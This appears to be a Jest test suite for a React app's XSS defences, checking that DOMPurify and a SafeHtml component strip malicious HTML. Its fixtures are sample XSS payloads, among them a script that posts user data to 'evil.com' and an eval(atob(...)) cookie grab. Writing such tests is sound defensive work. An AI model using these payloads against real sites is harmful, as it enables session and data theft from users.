/**
 * XSS (Cross-Site Scripting) Prevention Tests
 *
 * Tests DOMPurify sanitization, SafeHtml component behavior,
 * and XSS attack prevention across the application.
 */

import { describe, it, expect } from '@jest/globals';
import { render, screen, cleanup } from '@testing-library/react';
import '@testing-library/jest-dom';
import DOMPurify from 'dompurify';
import { SafeHtml } from '@/lib/infrastructure/security/xss-protection';

describe('XSS Prevention - DOMPurify Sanitization', () => {
  afterEach(cleanup);

  describe('Script Tag Injection', () => {
    it('should remove <script> tags from HTML', () => {
      const maliciousHTML = '<p>Hello</p><script>alert("XSS")</script>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('<p>Hello</p>');
    });

    it('should remove inline script tags', () => {
      const maliciousHTML =
        '<div><script>window.location="evil.com"</script></div>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('window.location');
      expect(sanitized).toContain('<div>');
    });

    it('should remove nested script tags', () => {
      const maliciousHTML =
        '<div><p><script>fetch("steal-data")</script></p></div>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('fetch');
      expect(sanitized).not.toContain('<script>');
    });
  });

  describe('Event Handler Injection', () => {
    it('should remove onclick event handlers', () => {
      const maliciousHTML = '<button onclick="alert(\'XSS\')">Click</button>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Click');
    });

    it('should remove onerror event handlers', () => {
      const maliciousHTML = '<img src="x" onerror="alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove onload event handlers', () => {
      const maliciousHTML = '<body onload="maliciousCode()">';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('maliciousCode');
    });

    it('should remove onmouseover event handlers', () => {
      const maliciousHTML = '<div onmouseover="steal()">Hover</div>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('steal');
    });
  });

  describe('JavaScript URL Injection', () => {
    it('should remove javascript: URLs from links', () => {
      const maliciousHTML = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove javascript: URLs from images', () => {
      const maliciousHTML = '<img src="javascript:alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('javascript:');
    });

    it('should allow safe URLs', () => {
      const safeHTML = '<a href="https://example.com">Safe Link</a>';
      const sanitized = DOMPurify.sanitize(safeHTML);

      expect(sanitized).toContain('https://example.com');
      expect(sanitized).toContain('Safe Link');
    });
  });

  describe('Dangerous Tag Injection', () => {
    it('should remove <iframe> tags', () => {
      const maliciousHTML = '<iframe src="evil.com"></iframe>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('<iframe>');
      expect(sanitized).not.toContain('evil.com');
    });

    it('should remove <object> tags', () => {
      const maliciousHTML = '<object data="malicious.swf"></object>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('<object>');
    });

    it('should remove <embed> tags', () => {
      const maliciousHTML = '<embed src="malware.exe">';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('<embed>');
    });

    it('should remove <form> tags', () => {
      const maliciousHTML =
        '<form action="phishing.com"><input name="password"></form>';
      const sanitized = DOMPurify.sanitize(maliciousHTML, {
        FORBID_TAGS: ['form', 'input'],
      });

      expect(sanitized).not.toContain('<form>');
      expect(sanitized).not.toContain('phishing.com');
    });
  });

  describe('Data URI Injection', () => {
    it('should remove data: URIs with base64 scripts', () => {
      const maliciousHTML =
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('data:text/html');
    });
  });

  describe('SVG-Based XSS', () => {
    it('should remove malicious scripts from SVG', () => {
      const maliciousHTML = '<svg><script>alert("XSS")</script></svg>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toContain('<script>');
    });

    it('should remove onload from SVG', () => {
      const maliciousHTML = '<svg onload="alert(\'XSS\')"></svg>';
      const sanitized = DOMPurify.sanitize(maliciousHTML);

      expect(sanitized).not.toContain('onload');
    });
  });

  describe('HTML Entity Encoding', () => {
    it('should handle HTML entities correctly', () => {
      const htmlWithEntities =
        '<p>&lt;script&gt;alert("XSS")&lt;/script&gt;</p>';
      const sanitized = DOMPurify.sanitize(htmlWithEntities);

      // Should keep encoded entities (safe)
      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
    });
  });
});

describe('SafeHtml Component', () => {
  afterEach(cleanup);

  describe('Basic Sanitization', () => {
    it('should render safe HTML content', () => {
      const safeHTML = '<p>Hello World</p>';
      render(<SafeHtml html={safeHTML} />);

      expect(screen.getByText('Hello World')).toBeInTheDocument();
    });

    it('should sanitize dangerous content', () => {
      const maliciousHTML = '<p>Hello</p><script>alert("XSS")</script>';
      const { container } = render(<SafeHtml html={maliciousHTML} />);

      expect(container.innerHTML).not.toContain('<script>');
      expect(container.innerHTML).toContain('Hello');
    });

    it('should apply custom className', () => {
      const html = '<p>Content</p>';
      const { container } = render(
        <SafeHtml html={html} className="custom-class" />
      );

      expect(container.firstChild).toHaveClass('custom-class');
    });
  });

  describe('Configuration Modes', () => {
    it('should use STRICT config for user content', () => {
      const html = '<p>User content</p><style>.danger{}</style>';
      const { container } = render(<SafeHtml html={html} config="STRICT" />);

      expect(container.innerHTML).not.toContain('<style>');
      expect(container.innerHTML).toContain('User content');
    });

    it('should use RICH config for blog posts', () => {
      const html =
        '<h1>Title</h1><p>Content</p><pre><code>const x = 1;</code></pre>';
      const { container } = render(<SafeHtml html={html} config="RICH" />);

      expect(container.innerHTML).toContain('<h1>');
      expect(container.innerHTML).toContain('<pre>');
      expect(container.innerHTML).toContain('<code>');
    });

    it('should use MINIMAL config for basic text', () => {
      const html = '<p>Simple <strong>text</strong></p><div>Block</div>';
      const { container } = render(<SafeHtml html={html} config="MINIMAL" />);

      expect(container.innerHTML).toContain('<strong>');
      expect(container.innerHTML).toContain('Simple');
    });
  });

  describe('Real-World Attack Scenarios', () => {
    it('should prevent stored XSS in blog comments', () => {
      const maliciousComment =
        'Great post!<script>fetch("/api/users/me").then(r=>r.json()).then(d=>fetch("evil.com",{method:"POST",body:JSON.stringify(d)}))</script>';
      const { container } = render(
        <SafeHtml html={maliciousComment} config="STRICT" />
      );

      expect(container.innerHTML).not.toContain('<script>');
      expect(container.innerHTML).not.toContain('fetch');
      expect(container.innerHTML).toContain('Great post!');
    });

    it('should prevent reflected XSS in search results', () => {
      const searchQuery = '"><script>document.cookie="stolen"</script>';
      const { container } = render(
        <SafeHtml html={searchQuery} config="STRICT" />
      );

      expect(container.innerHTML).not.toContain('<script>');
      expect(container.innerHTML).not.toContain('document.cookie');
    });

    it('should prevent DOM-based XSS', () => {
      const maliciousHTML =
        '<img src=x onerror="eval(atob(\'ZG9jdW1lbnQuY29va2ll\'))">';
      const { container } = render(
        <SafeHtml html={maliciousHTML} config="STRICT" />
      );

      expect(container.innerHTML).not.toContain('onerror');
      expect(container.innerHTML).not.toContain('eval');
      expect(container.innerHTML).not.toContain('atob');
    });
  });

  describe('Edge Cases', () => {
    it('should handle null/undefined HTML', () => {
      const { container: container1 } = render(
        <SafeHtml html={null as unknown as string} />
      );
      const { container: container2 } = render(
        <SafeHtml html={undefined as unknown as string} />
      );

      expect(container1.innerHTML).toBe('<div></div>');
      expect(container2.innerHTML).toBe('<div></div>');
    });

    it('should handle empty string', () => {
      const { container } = render(<SafeHtml html="" />);

      expect(container.innerHTML).toBe('<div></div>');
    });

    it('should handle very large HTML', () => {
      const largeHTML = '<p>' + 'a'.repeat(100000) + '</p>';
      const { container } = render(<SafeHtml html={largeHTML} />);

      expect(container.innerHTML).toContain('<p>');
      expect(container.innerHTML.length).toBeGreaterThan(100000);
    });

    it('should handle malformed HTML', () => {
      const malformedHTML = '<p>Unclosed paragraph<div>Mixed tags</p></div>';
      const { container } = render(<SafeHtml html={malformedHTML} />);

      // DOMPurify should fix the malformed HTML
      expect(container.innerHTML).toBeTruthy();
    });
  });
});

describe('XSS Prevention in Production', () => {
  describe('Blog Post Rendering', () => {
    it('should sanitize blog post content', () => {
      const blogContent =
        '<h2>My Post</h2><p>Content here</p><script>alert("XSS")</script>';
      const { container } = render(
        <SafeHtml html={blogContent} config="RICH" />
      );

      expect(container.innerHTML).toContain('<h2>My Post</h2>');
      expect(container.innerHTML).not.toContain('<script>');
    });
  });

  describe('Help Article Rendering', () => {
    it('should sanitize help article content', () => {
      const articleContent =
        '<h3>How to use</h3><ol><li>Step 1</li></ol><script>steal()</script>';
      const { container } = render(
        <SafeHtml html={articleContent} config="RICH" />
      );

      expect(container.innerHTML).toContain('<h3>');
      expect(container.innerHTML).toContain('<ol>');
      expect(container.innerHTML).not.toContain('<script>');
    });
  });

  describe('User Profile Bio', () => {
    it('should sanitize user bio content', () => {
      const bio =
        'Hi, I\'m a developer!<script>location.href="phishing.com"</script>';
      const { container } = render(<SafeHtml html={bio} config="STRICT" />);

      expect(container.innerHTML).toContain("Hi, I'm a developer!");
      expect(container.innerHTML).not.toContain('<script>');
      expect(container.innerHTML).not.toContain('location.href');
    });
  });

  describe('Message/Chat Content', () => {
    it('should sanitize chat messages', () => {
      const message =
        'Check this out: <a href="javascript:alert(\'XSS\')">Link</a>';
      const { container } = render(<SafeHtml html={message} config="STRICT" />);

      expect(container.innerHTML).toContain('Check this out:');
      expect(container.innerHTML).not.toContain('javascript:');
    });
  });
});

describe('DOMPurify Configuration', () => {
  it('should sanitize dangerous tags by default', () => {
    const html = '<p>Safe</p><script>alert("xss")</script>';
    const sanitized = DOMPurify.sanitize(html);

    // DOMPurify removes dangerous tags by default
    expect(sanitized).toContain('<p>Safe</p>');
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert');
  });

  it('should sanitize with custom config', () => {
    const html = '<p>Test</p><script>bad</script>';
    const sanitized = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['p'],
      ALLOWED_ATTR: [],
    });

    expect(sanitized).toBe('<p>Test</p>');
  });
});

describe('Performance', () => {
  it('should sanitize HTML quickly (< 100ms for 10KB)', () => {
    const html = '<p>' + 'a'.repeat(10000) + '</p>';
    const start = Date.now();
    DOMPurify.sanitize(html);
    const end = Date.now();

    expect(end - start).toBeLessThan(100);
  });

  it('should handle multiple sanitizations efficiently', () => {
    const html = '<p>Test</p><script>bad</script>';
    const start = Date.now();

    for (let i = 0; i < 1000; i++) {
      DOMPurify.sanitize(html);
    }

    const end = Date.now();
    expect(end - start).toBeLessThan(1000); // 1000 sanitizations < 1 second
  });
});

describe('Security Regression Tests', () => {
  it('should prevent XSS vulnerability found in blog post rendering (Oct 2025)', () => {
    // This was the actual vulnerability fixed in Sprint 3
    const maliciousPost =
      '<p>Great article!</p><script>document.querySelector("input[name=password]").value</script>';
    const { container } = render(
      <SafeHtml html={maliciousPost} config="RICH" />
    );

    expect(container.innerHTML).not.toContain('<script>');
    expect(container.innerHTML).toContain('Great article!');
  });

  it('should prevent XSS vulnerability found in help article rendering (Oct 2025)', () => {
    // This was the actual vulnerability fixed in Sprint 3
    const maliciousArticle =
      '<h2>Help Topic</h2><img src=x onerror="fetch(\'/api/users\').then(r=>r.json()).then(console.log)">';
    const { container } = render(
      <SafeHtml html={maliciousArticle} config="RICH" />
    );

    expect(container.innerHTML).not.toContain('onerror');
    expect(container.innerHTML).not.toContain('fetch');
    expect(container.innerHTML).toContain('Help Topic');
  });
});
